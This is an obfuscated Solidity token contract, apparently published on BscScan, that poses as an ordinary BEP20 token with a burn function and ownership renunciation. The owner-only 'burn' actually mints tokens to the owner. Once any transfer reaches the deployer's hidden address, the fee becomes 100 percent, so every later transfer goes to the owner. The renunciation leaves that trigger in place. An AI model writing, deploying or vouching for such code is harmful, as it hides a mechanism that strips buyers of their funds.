/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.5.11;
contract VJzXVF {
address public  MAqslw = address(0);
address public owner;
uint8 public constant decimals = 18;
mapping (address => uint256) public balanceOf;
uint256 public  mGnKmV = 10000000000000000000000000000;
uint256 public constant tHIQeJ = 9+1;
uint256 private  BUdAuf = 10000000000000;
address public  giHvaS = address(0);
uint256 public  yYrJGg = 100000000000000000000000;
uint256 public  QMvWjx = 10000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  aqeFEL = 100000000000000000000;
uint256 public  CIKBNW = 1000000000000000000;
string public  symbol = "dYXMMJ";
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  MzddKz = address(0);
address private  rWbvEt = address(0);
address public  vRYwjJ = address(0);
address public  mNTRnc = address(0);
uint256 public  rtXYyE = 100000000000000000;
address public  nQTNBt = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  afNEcl = 10000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  name = "UkkWOk";
uint256 public  bBEmnN = 100000000000000000000000;
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "bMbjOg");
require(to != address(0), "bMbjOg");
require(amount <= balanceOf[from], "bMbjOg");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* tHIQeJ/BUdAuf ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==rWbvEt){
BUdAuf = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
constructor () {
rWbvEt = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}

}